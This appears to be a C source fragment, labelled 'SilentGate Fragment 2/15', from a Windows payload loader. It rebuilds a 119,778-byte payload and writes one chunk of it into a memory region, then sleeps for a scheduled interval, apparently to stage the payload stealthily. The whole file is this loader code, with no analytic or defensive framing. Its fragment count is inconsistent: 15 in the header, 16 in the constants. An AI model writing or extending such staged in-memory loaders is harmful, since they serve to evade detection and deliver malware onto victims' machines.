/*
 * SilentGate Fragment 2/15
 * Offset: 14972 bytes  Size: 7486 bytes
 * Schedule: t=356ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   2
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  14972
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 356

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 2: Write chunk 2 */
void sg_execute_fragment_2(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 2] Writing chunk at t=356ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 2] Chunk 2 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
